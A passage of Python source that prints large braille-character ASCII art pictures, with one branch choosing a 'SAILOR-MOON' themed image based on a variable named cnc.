            print('⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⣉⡙⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠦⠛⠛⠁⠐⠶⢾⣿⣷⣿⣿⠀⠀⣴⠞⠁⠀⣿⣿⣿⣿⣆⠀⠀')
            print('⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣡⡞⠋⠀⠉⠙⠲⢤⣉⠉⠛⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣇⣀⣀⣼⣿⣿⣿⣿⣿⠀⠀')
            print('⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠈⠻⢷⣦⣤⣀⣀⣀⣀⣀⣈⡉⠛⢛⣛⣛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀')
            print('⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠛⠛⠛⠉⠀⠀⠀⠀⠀⠈⠉⠛⢷⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀')
            print('⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀')
            print('⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀')
            print('⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀')
            print('⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣷⣀⠈⠀⠀⠀⠀⠀⠀⠀⢀⣼⠁⠀⠀⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀')
            print('⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣳⣤⣄⡀⠀⠀⣠⣤⠞⠁⠀⠀⠀⠹⣧⡀⠀⠀⠀⠀⠀⣀⣀⠀⠀⠀⣴⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇')
            print('⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠛⠉⡅⠈⠙⠛⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠹⣷⣤⡀⠀⠀⠀⠀⠀⢀⣴⡞⠋⠀⣿⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⢷⣶⣶⠶⠾⠋⠉⠀⢀⣴⠋⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢿⡗⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠈⠻⢿⣿⣿⣿⡿⠛⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⢿⡟⢩⠿⠙⢶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⡟⢿⡟⢦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⢿⡟⢠⡟⠀⣰⢦⡈⠙⠲⢦⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⢾⡿⠩⣷⠀⠹⡎⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⣼⣣⡏⠀⣼⠇⣼⠃⠀⠘⠶⢤⣀⡀⠀⠉⠉⠉⠛⠛⠛⠛⠛⠋⠉⠀⢀⣵⡆⠀⢸⡄⠀⠹⣜⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⣸⢯⣿⡇⢀⡟⠀⠁⠀⠀⠀⠀⠀⡼⠙⠛⣶⠒⠤⠤⣤⠤⣤⣤⠤⠒⠚⠉⠉⣧⠀⠈⢷⠀⠀⠻⡝⢷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⢠⣷⣿⣿⢀⣾⠀⠀⠀⠀⢠⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠁⠀⠀⡏⠀⠀⢠⠀⠀⢻⠀⠀⠘⡆⠀⠀⢻⡄⠻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⣾⡟⠁⡇⢸⡇⠀⠀⠀⠀⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡇⠀⢀⠈⡄⠀⠀⣇⠀⠀⢻⡄⠀⠈⢿⡀⠹⣦⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⢠⣿⠁⣸⠃⢸⡇⠀⠠⠀⢸⡇⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⡇⠀⠈⣧⡇⠀⠀⢻⡄⠀⠈⢧⠀⠀⠘⣷⡀⢹⣆⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⢀⣿⠇⢰⣿⠀⢸⠀⠀⠀⠀⡎⠇⠀⠠⠀⠀⠀⣸⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠘⣿⠀⠀⠈⣇⠀⠀⠸⣆⠀⠀⠹⣷⡀⢿⡆⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⣸⡟⠀⢈⣿⠀⡏⠀⠀⢸⢰⡇⠀⠀⡆⠀⠀⠀⣿⠀⠀⠀⡁⠀⠀⠀⣿⠀⠀⠀⢹⡇⠀⠀⢸⡄⠀⠀⢻⡀⠀⠀⢹⣷⠈⢿⡄⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⢰⣿⠁⠀⣿⡏⢠⡇⠀⠀⣾⣸⡇⠀⠀⡇⠀⠀⠀⡟⠀⠀⠀⡄⠀⠀⠀⣿⠀⠀⠀⠸⣿⠀⠀⠘⣷⠀⠀⠈⣷⠀⠀⠘⣿⣆⣸⣷⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⢹⣿⣶⣶⣿⠇⣼⠇⠀⠀⣿⣿⡃⠀⢰⡇⠀⠀⢸⡇⠀⠀⠀⡇⠀⠀⠀⢸⠀⠀⠀⠀⣿⡄⠀⠀⢹⡇⠀⠀⢻⣧⠀⠀⢹⣿⠿⠋⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠘⠛⠉⠉⣿⣆⣿⡀⠀⠀⣿⣿⠃⠀⢸⡇⠀⠀⢸⡇⠀⠀⠀⡇⠀⠀⠀⢸⠀⠀⠀⠀⢹⡇⠀⠀⠈⣿⠀⠀⠘⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡿⢶⣄⣿⣿⠀⠀⣿⠀⠀⠀⢸⡇⠀⠀⠀⡇⠀⠀⠀⢸⡅⠀⠀⠀⢸⣿⠀⠀⠀⣿⣷⣶⣶⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣶⣽⣿⣿⣆⠀⣿⡀⠀⠀⢸⣧⠀⠀⠀⡧⠀⠀⠀⠈⡇⠀⠀⠀⢸⣿⢠⡔⣻⣿⡿⡿⠻⢻⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣇⠉⠻⢿⣿⣏⡑⣿⣯⣙⠲⢼⣿⢦⡀⠀⣿⣤⣀⠀⠀⣿⡗⠒⢠⣼⣿⣿⣿⡿⠋⠀⠀⠀⣸⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⡄⠀⠈⠁⠹⣿⣿⡟⣿⣿⣿⣿⣷⣍⠰⣿⣷⣬⣁⢰⣿⣿⣿⣷⡾⠟⠋⠉⠀⠀⠀⠀⠀⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡅⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⡡⣿⣿⣿⡟⠻⣿⣿⡿⠋⠹⠛⠻⠃⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⣤⡄⣽⣿⣿⣇⢠⣥⣬⣯⣠⣾⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')

        
        elif "SAILOR-MOON" in cnc:
            print(' ⢃⠊⠁⠀⠀⠀⠀⠀⠀⠀⡀⡀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⡔⡀⢂⠔⡀⠄⢂⠔⡀⢂⠔⡀⢂⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⡀⢀⠀⠠⢀⠠⠂⢠⠂⡍⠲⡥⢣⣍⠞⡴⣋⠖⣍⠪⣅⠫⢌⠣⢘⡐⠣⢎⠱⢍⡞⡰⢫⢭⣙⢧ ')
            print('⠀⠀⢀⠀⠀⠀⠠⠀⠰⠀⡀⠌⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢠⠐⡁⠆⠐⣈⠠⢂⠘⠰⠤⠁⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠐⠀⠂⢁⠢⢁⠂⠁⠂⠒⠁⡑⠒⠍⠬⡙⠖⠥⡋⠤⠓⡄⠎⠤⠓⡠⢌⠱⢄⠪⠔⠬⡑⢏⠶⢩⠞ ')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠆⡰⠁⡐⢁⠄⢀⠂⠈⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠐⠠⠐⠀⠀⠀⠀⠀⠀⠀⢀⠀⠈⠄⠁⠊⡅⠜⠨⢅⡜⡰⢈⡰⢈⠰⢉⠆⡉⢆⡸⢄⠎ ')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠤⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠠⠑⠠⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡐⠠⠈⡀⢃⠘⠌⡓⢤⠢⠰⢌⠰⡈⢆⠅⣊⠐⡃⢔⠊⡔ ')
            print('⠐⠀⠀⠀⠀⠀⠀⢀⠈⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠡⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠌⠐⡀⠃⡀⠐⠠⠁⠠⠈⡐⠁⢆⢩⠒⡡⡘⠄⠌⢒⣀⠣⢉⢂⠋⡔ ')
            print('⠀⠐⠀⠀⡀⠐⠂⠀⠌⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣶⣶⣶⣶⣶⣴⣎⡐⠐⠠⡉⢄⠡⠒⠈⢀⠁⠄⠁⠂⢂⠁⠒⢈⠌⠊⢄⠀⠂⠅⠢⠑⡌ ')
            print('⠀⠠⠀⠁⠐⠀⢀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡶⢟⠛⡍⠛⡿⣯⠝⣻⣷⣦⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⠤⣄⠀⠀⠀⠀⠀⠀⣀⣤⡾⢟⠩⣱⢢⣿⡓⣦⣿⠫⢝⢻⣷⣤⠅⠊⠀⠁⠀⠀⠀⠀⠀⠈⠄⡘⠠⢀⠂⠡⠀⠂⠀⠀⠀⠁⠌ ')
            print('⢂⠀⠐⠀⡀⠒⠀⢀⠈⠀⢀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⢠⣾⢟⠋⡜⢈⠖⣈⠳⢂⣙⣿⡨⣷⡎⠽⣧⡀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣤⣤⣤⡴⣤⣤⣤⣤⣀⡀⠀⠀⣀⣠⣤⢤⣶⠖⠋⠁⠀⣠⣟⠀⠀⠀⠀⠀⣶⣿⢋⠲⣉⣶⠷⡟⠛⠛⠟⢶⣯⡜⠢⡜⣹⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⠀⠌⡐⠂⢀⠀⠀⠀⠀⠈ ')
            print('⠠⢈⠄⠁⠠⠀⠁⡀⠀⠈⡀⠀⠀⠀⠀⠀⠄⠁⡀⠀⠀⠠⠀⡀⠐⠀⠄⠂⡁⠐⠈⣰⣿⠿⠾⣷⣦⣷⠾⣟⡛⠿⢿⣛⣿⣽⣇⡒⡘⣿⡄⢀⣠⣴⣾⠿⠿⢿⣦⣖⣠⠀⢆⠰⢀⠢⢈⠉⠙⢻⠛⢉⣡⠞⠋⠀⠀⠀⣠⡾⢿⣿⣿⣷⣦⣄⣼⡟⡡⢎⣱⠟⣩⣶⡟⡉⢉⣿⣶⣌⢻⣷⣜⣰⡼⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠐⠀⠄⠀⠀⠀⠀⠀')
            print('⢠⠁⢂⠌⡐⠁⠠⢀⠐⠁⠀⠂⠈⢀⠠⠁⠀⠂⢀⠠⠁⡀⠂⠀⠄⡈⠄⠂⠄⢂⢢⣿⠇⣌⣑⢦⡟⣴⣿⣯⠐⠀⣸⣿⣷⣝⢯⣒⣭⣾⡿⠛⠭⢉⠩⠛⠿⣦⣆⡩⢙⢃⠒⡌⢂⠁⠂⠌⠀⣸⡶⠛⠁⠀⠀⠀⣠⢾⣱⣾⠿⢋⠍⡰⢀⠏⡻⢿⣶⣽⢋⣾⣿⣻⣽⡷⣯⣟⣾⣻⣧⢻⣿⣯⣛⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠂⠀⠀⠀⠀⠀')
            print('⠠⠘⡀⡂⠠⢂⠁⢂⠠⠁⡐⠠⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⢂⠌⠔⡉⠤⣽⣿⣿⣾⢿⡿⢼⡿⣿⣾⡿⣿⣿⣟⣷⣿⣿⡿⠫⠴⡀⣇⣌⣑⢢⠑⡒⣠⠹⢃⠌⢂⠡⢀⠂⠌⢀⣰⠞⠉⠀⠀⠀⢀⣴⢛⣷⠿⢋⠄⠣⠌⢆⢑⠊⡔⢡⠎⡸⢿⣿⣟⣓⣿⣳⣟⣟⡾⣿⢯⣿⡰⡿⢌⠻⢿⣿⡄⠀⠂⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀')
            print('⢒⠡⡐⡁⢂⠁⠌⢀⠂⢀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠁⢿⣿⣿⢃⢞⣯⢿⣿⣽⣯⢿⣽⣷⣿⣻⡿⠍⠴⣁⣶⠟⠉⠉⠉⠙⠛⠳⡶⠶⣥⣌⠂⢄⠀⣰⡶⠋⠁⠀⠀⠀⢀⡴⠻⡀⠮⢀⠌⠢⡌⡑⠌⠢⢌⠱⢈⠆⡸⢄⢃⠎⡿⣿⣾⣳⣧⡟⣟⣻⣯⡟⣽⡿⢎⡱⢺⣿⡴⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠠⠑⢠⠁⠊⠄⢈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣯⣿⣮⣽⣞⢷⣿⣾⣯⢿⣽⡿⣙⠜⣼⡿⠋⠀⠀⢠⠀⠀⠀⠀⠀⣿⠀⠀⠉⢻⡾⠞⠁⠀⠀⠀⠀⣠⠴⢋⣴⣷⣿⣿⢆⠘⠤⠐⠤⢉⠢⡁⠎⡰⢈⠅⢢⡘⢚⠴⣩⢿⣿⣶⣿⣾⢿⣿⣵⡿⣿⣂⣧⣿⠥⠄⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⢂⠩⢐⡈⢁⠂⠀⠐⠈⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣷⣿⣻⣿⣷⣭⣛⠛⠾⡿⢣⣾⠟⠁⠀⠀⠠⣤⠏⠀⠀⠀⠀⡴⠃⠀⠀⢀⡞⠀⠀⠀⠀⠀⣀⠞⢁⠰⠿⠿⠫⢷⠾⠿⣐⠈⡑⣌⣢⣲⡴⠾⠶⠓⠚⣷⡰⢉⡒⠤⣋⢿⣯⣿⣿⡿⣿⣟⣿⣿⣿⣿⣿⠙⠠⠐⡀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⡀⠆⡐⡈⠔⠨⢁⠈⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⢿⣿⣿⣯⣟⡿⣿⣿⡿⣿⠟⠁⠀⠀⠀⠙⣲⠋⠀⠀⠀⢀⡜⠁⠀⠀⣠⠏⠀⠀⠀⠀⢠⡴⠋⡀⠆⡐⢢⢐⣱⣦⣼⠭⠖⠛⠉⠉⠀⠀⠀⠀⠀⣀⣴⠟⣀⠣⢌⠲⢈⣾⣿⣿⣿⣽⣿⣿⣿⣿⣿⢿⣿⠀⠄⡁⠠⠁⠄⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠠⠑⠄⡑⠨⠁⠂⡀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡌⡙⢿⡿⣿⣿⣿⡿⠛⠁⠀⠀⠀⠀⠀⣸⠁⠀⠀⠀⣠⠞⠀⠀⠀⡴⠃⠀⠀⠀⢀⡴⠉⣄⣁⣰⡶⠖⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⣀⣠⡤⠶⠛⡁⠆⡘⢀⠒⡈⢄⣻⢧⡿⣋⢉⡉⠛⠻⢿⣿⡥⢾⣿⠋⡄⠀⢁⠂⡐⢀⠁⠂⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⢁⠀⠀⠀⠀⠰⡀⠁⡆⠈⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣰⠀⠆⠹⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⢀⡇⠀⠀⣰⠾⠁⠀⢀⣰⡏⠉⠁⠀⠀⠀⣾⣷⠿⠏⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣰⣶⠿⡉⠰⠈⢶⣁⣀⠇⢰⠉⣀⠱⠈⢿⣾⠿⢀⠎⡈⢁⠉⡆⠸⢹⣿⡏⠹⢆⠈⡀⠶⠀⠆⠰⠀⡀⢁⠀⠆⠁⠀⠀⠀⠀⠀⠀⠀')
            print('⠀⠀⡀⠀⠀⠀⠀⠀⠑⠀⠁⠀⠄⠠⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠄⡠⢈⣽⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠣⢤⡎⠁⠀⣠⠔⠋⠀⠘⢦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⡴⠾⠛⠙⢿⣆⠰⣀⠣⠌⡠⠙⣿⣎⠄⡒⠄⢂⠣⠄⡉⠅⢂⠒⠌⢂⢒⣤⣇⡡⠹⣷⡄⠀⠂⠁⠌⠁⣈⠁⠒⠈⠤⡈⠠⠀⠂⡀⠁⠀⢀⠀⡀')
            print('⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⢤⣷⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⠤⠞⠁⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⢠⡤⠶⠛⠉⠀⠀⠀⢀⣴⣿⣿⠒⠠⠐⡂⣁⠊⠔⣿⡌⠄⡓⢈⠢⠘⡐⠌⡨⢈⠜⡀⢊⠹⢿⣿⣷⣾⣿⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⢃⠘⡠⠐⠈⠄⡀⠂⡀')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡤⠟⠋⢁⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⠶⠋⠁⠀⠀⠀⠀⢀⣠⣾⣿⠿⣉⣿⠄⣁⠒⡐⠄⡌⢂⣿⣋⠢⠘⠄⡌⡑⠰⠐⡰⢈⠰⠠⢁⠂⢍⢻⣷⡙⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢀⡃⡌⡐⠰⢀⠃')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⠴⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣍⠀⠀⠀⠀⠀⢀⢀⣴⣾⣿⠿⣡⢚⣴⣿⠒⡠⢁⠌⢒⠈⠄⣼⣿⡔⢃⠌⡐⢠⠁⢎⡀⠎⠠⠑⡈⢌⠂⠄⠻⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢆⠰⠡⣉⢄⡋')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⠴⠚⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠤⠄⠀⠀⠀⠀⣠⠟⣍⠿⢿⣷⣤⡀⠀⢀⣼⣾⣿⠟⣭⢚⡷⣯⣾⠋⡔⠡⢚⠾⣦⣭⣾⡟⣺⡟⠢⠄⡡⢂⠌⡠⠐⡈⢄⠃⡐⠂⢄⠊⡐⢻⣇⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⡐⠠⢁⠓⢌⠢⡑')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⡤⠖⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⠦⠿⠿⣮⣽⣿⣿⣶⣿⣿⢻⣬⠻⣵⣿⡾⠟⡡⠃⡄⢃⠌⣐⣶⠿⠛⢷⣿⣍⡁⠂⠅⢂⡐⡁⢡⠢⠐⢂⡁⠌⠰⡐⢀⢎⣿⡀⠀⠀⠀⠀⠀⠐⠈⠀⠀⠀⢂⠀⠄⠂⠄⡈⠠⠁⡍')
            print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠤⠖⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⣟⢿⣿⡶⢵⢋⢶⣻⣿⡶⣧⣷⡶⠷⠾⠛⠁⢀⣴⡾⠏⠻⢿⣌⠌⣤⣾⡇⠐⡐⠌⡠⠐⢨⠐⠰⣀⢺⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⠄⠀⠄⡀⡁⠡⢂⡐')
